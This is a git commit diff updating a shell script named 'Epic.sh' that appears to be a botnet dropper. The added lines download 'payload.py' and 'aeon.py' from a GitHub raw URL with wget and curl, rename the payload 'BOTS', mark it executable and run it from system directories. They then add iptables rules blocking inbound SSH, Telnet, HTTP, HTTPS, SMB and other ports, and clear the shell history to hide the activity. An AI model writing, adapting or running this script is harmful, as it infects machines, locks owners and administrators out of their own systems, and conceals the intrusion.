bb4b59bf6dfa964d64bbc12ef42d5857aa024cbf
HaxTermux <93824226+Hex1629@users.noreply.github.com>
2023-06-09 19:18:51 +0700

    Update Epic.sh

--- Epic.sh
+++ Epic.sh
@@ -1,11 +1,40 @@
 #!/usr/bin/env
 #!/bin/bash
 #!/usr/bin/python
+
+pip install cryptography || pip3 install cryptography || python -m pip install cryptography || python3 -m pip install cryptography|| python -m pip3 install cryptography || python3 -m pip3 install cryptography
 pip install requests || pip3 install requests || python -m pip install requests || python3 -m pip install requests|| python -m pip3 install requests || python3 -m pip3 install requests
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://github.com/Hex1629/nulled_project.py/blob/main/payload.py; curl https://github.com/Hex1629/nulled_project.py/blob/main/payload.py;cat payload.py >BOTS;chmod +x *;./BOTS
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://github.com/Hex1629/nulled_project.py/blob/main/payload.py; curl https://github.com/Hex1629/nulled_project.py/blob/main/payload.py;chmod +x *;./payload.py
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://github.com/Hex1629/nulled_project.py/blob/main/payload.py; curl https://github.com/Hex1629/nulled_project.py/blob/main/payload.py;chmod +x *;python3 payload.py
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://github.com/Hex1629/nulled_project.py/blob/main/payload.py; curl https://github.com/Hex1629/nulled_project.py/blob/main/payload.py;cat payload.py >BOTS;chmod 777;./BOTS
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://github.com/Hex1629/nulled_project.py/blob/main/payload.py; curl https://github.com/Hex1629/nulled_project.py/blob/main/payload.py;chmod 777;./payload.py
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://github.com/Hex1629/nulled_project.py/blob/main/payload.py; curl https://github.com/Hex1629/nulled_project.py/blob/main/payload.py;chmod 777;python3 payload.py
+
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/Hex1629/nulled_project.py/main/payload.py; curl https://raw.githubusercontent.com/Hex1629/nulled_project.py/main/payload.py;cat payload.py >BOTS;chmod +x *;./BOTS
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/Hex1629/nulled_project.py/main/payload.py; curl https://raw.githubusercontent.com/Hex1629/nulled_project.py/main/payload.py;chmod +x *;./payload.py
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/Hex1629/nulled_project.py/main/payload.py; curl https://raw.githubusercontent.com/Hex1629/nulled_project.py/main/payload.py;chmod +x *;python3 payload.py
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/Hex1629/nulled_project.py/main/payload.py; curl https://raw.githubusercontent.com/Hex1629/nulled_project.py/main/payload.py;cat payload.py >BOTS;chmod 777;./BOTS
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/Hex1629/nulled_project.py/main/payload.py; curl https://raw.githubusercontent.com/Hex1629/nulled_project.py/main/payload.py;chmod 777;./payload.py
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/Hex1629/nulled_project.py/main/payload.py; curl https://raw.githubusercontent.com/Hex1629/nulled_project.py/main/payload.py;chmod 777;python3 payload.py
+
+wget https://raw.githubusercontent.com/Hex1629/nulled_project.py/main/aeon.py; curl https://raw.githubusercontent.com/Hex1629/nulled_project.py/main/aeon.py;chmod +x *;python3 aeon.py
+
+iptables -A INPUT -p tcp -dport 30120 -j DROP
+iptables -A INPUT -p tcp -dport 8080 -j DROP
+iptables -A INPUT -p tcp -dport 2323 -j DROP
+iptables -A INPUT -p udp -dport 445 -j DROP
+iptables -A INPUT -p tcp -dport 443 -j DROP
+iptables -A INPUT -p tcp -dport 80 -j DROP
+iptables -A INPUT -p tcp -dport 37 -j DROP
+iptables -A INPUT -p tcp -dport 23 -j DROP
+iptables -A INPUT -p tcp -dport 22 -j DROP
+
+iptables -A INPUT -p udp -dport 30120 -j DROP
+iptables -A INPUT -p udp -dport 11215 -j REJECT
+iptables -A INPUT -p udp -dport 11214 -j REJECT
+iptables -A INPUT -p udp -dport 11211 -j REJECT
+iptables -A INPUT -p udp -dport 8080 -j DROP
+iptables -A INPUT -p udp -dport 2323 -j DROP
+iptables -A INPUT -p udp -dport 445 -j DROP
+iptables -A INPUT -p udp -dport 443 -j DROP
+iptables -A INPUT -p udp -dport 80 -j DROP
+iptables -A INPUT -p udp -dport 37 -j DROP
+iptables -A INPUT -p udp -dport 23 -j DROP
+iptables -A INPUT -p udp -dport 22 -j DROP
+
 history -c
